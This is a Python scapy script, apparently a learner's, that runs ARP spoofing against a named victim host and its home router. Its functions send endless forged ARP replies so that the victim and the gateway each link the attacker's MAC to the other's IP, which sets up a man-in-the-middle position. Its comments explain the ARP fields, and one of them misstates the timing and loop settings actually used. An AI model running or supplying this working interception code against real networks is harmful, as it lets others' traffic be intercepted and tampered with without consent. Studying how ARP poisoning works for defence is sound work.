# main.py
from scapy.all import *


default_gateway_ip = "192.168.1.254"
victim_mac = "3C:0A:F3:5A:CE:43"
victim_ip = "192.168.1.79"
gateway_mac = "F8:22:29:26:79:70"


def pen_test_poison(victim_ip: str, victim_mac: str, default_gateway_ip: str):
    '''
    the sendp function works on layer 2 (Data Link) so in the subnet locally with ethernet
    so its in the MAC addressing and local IP communication area
    Ethernet frames contain MAC addresses (src and dst) while packets contain IP addresses (src and dst)
    this function builds an ethernet frame and then the packet content of the ethernet frame the "/" defines encapsulation
    '''
    sendp(Ether(dst=victim_mac) / # Ether() builds an ethernet frame with the destination of the target device (MAC address is like a fixed "name" of a device on the LAN)
          ARP(op="who-has", # ARP() creates an ARP packet (ARP is the protocol to match local IPs and MAC addresses) the op (operation) who-has means the ARP is a question not reply 
            psrc=default_gateway_ip, # protocol source address we lie and pretend this comes from the gateway (router in our case)
            pdst=victim_ip), # the pdst (Protocol destination address) is the address we are focusing on with ARP in this case asking who it belongs to
            inter=0.1, count=20) # interval of 0.2 means send one of these packets every 0.2 seconds and loop 1 means forever


# my MAC address: 3C-55-76-DE-12-EF
# 192.168.1.122


def poison_victim(victim_ip: str, victim_mac: str, default_gateway_ip: str):
    sendp(Ether(dst=victim_mac) / # build ethernet frame with destination of the victim (the frame also includes the source MAC address by default)
      ARP(op="is-at", # op is-at means this is a reply so an assertion
          psrc=default_gateway_ip, # the protocol source IP we claim "is-at" the source MAC address
          pdst=victim_ip, # protocol destination address, the IP we are talking to
          hwdst=victim_mac, # hardware MAC destination, the hardware MAC address this ARP packet is intended for at the destination
          hwsrc="3C:55:76:DE:12:EF"), # The hardware MAC address source, the MAC address we claim is-at the IP address this is defined by default and doesnt need to be metnioned explicitly
          inter=0.2, loop=1)


def poison_gateway(gateway_ip, gateway_mac, victim_ip):
    sendp(Ether(dst=gateway_mac) / 
      ARP(op="is-at",
          psrc=victim_ip,
          pdst=gateway_ip,
          hwdst=gateway_mac,
          hwsrc="3C:55:76:DE:12:EF"),
          inter=0.2, loop=1)